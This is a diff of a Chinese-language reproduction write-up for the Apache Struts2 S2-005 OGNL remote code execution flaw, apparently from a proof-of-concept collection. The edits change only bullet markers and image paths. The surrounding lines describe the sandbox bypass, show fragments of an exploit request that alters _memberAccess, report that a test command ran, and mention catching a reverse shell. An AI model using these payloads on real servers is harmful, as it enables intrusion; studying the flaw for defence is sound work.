@@ -17,13 +17,13 @@ action.getUser().setFavoriteDrink("kumys")
 
 触发漏洞就是利用了这个点，再配合 OGNL 的沙盒绕过方法，组成了 S2-003。官方对 003 的修复方法是增加了安全模式（沙盒），S2-005 在 OGNL 表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：
 
-- S2-003 使用 `\u0023` 绕过 s2 对 `#` 的防御
-- S2-003 后官方增加了安全模式（沙盒）
-- S2-005 使用 OGNL 表达式将沙盒关闭，继续执行代码
+* S2-003 使用 `\u0023` 绕过 s2 对 `#` 的防御
+* S2-003 后官方增加了安全模式（沙盒）
+* S2-005 使用 OGNL 表达式将沙盒关闭，继续执行代码
 
 漏洞详情:
 
-- http://struts.apache.org/docs/s2-005.html
+* http://struts.apache.org/docs/s2-005.html
 
 ## 漏洞影响
 
@@ -48,17 +48,17 @@ Host: target:8080
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36
 ```
 
-![image-20220301161455042](images/202203011614123.png)
+![image-20220301161455042](../.gitbook/assets/202203011614123.png)
 
 命令 `touch /tmp/awesome_poc` 成功执行：
 
-![image-20220301161548594](images/202203011615639.png)
+![image-20220301161548594](../.gitbook/assets/202203011615639.png)
 
 网上一些 POC 放到 tomcat8 下会返回 400，研究了一下发现字符 `\`、`"` 不能直接放 path 里，需要 urlencode，编码以后再发送就好了。这个 POC 没回显。
 
 POC 用到了 OGNL 的 Expression Evaluation：
 
-![](images/202203011611125.jpeg)
+![](../.gitbook/assets/202203011611125.jpeg)
 
 大概可以理解为，`(aaa)(bbb)` 中 aaa 作为 OGNL 表达式字符串，bbb 作为该表达式的 root 对象，所以一般 aaa 位置如果需要执行代码，需要用引号包裹起来，而 bbb 位置可以直接放置 Java 语句。`(aaa)(bbb)=true` 实际上就是 `aaa=true`。不过确切怎么理解，还需要深入研究，有待优化。
 
@@ -97,4 +97,4 @@ GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethod
 
 成功接收反弹 shell：
 
-![image-20220301162511817](images/202203011625901.png)
+![image-20220301162511817](../.gitbook/assets/202203011625901.png)
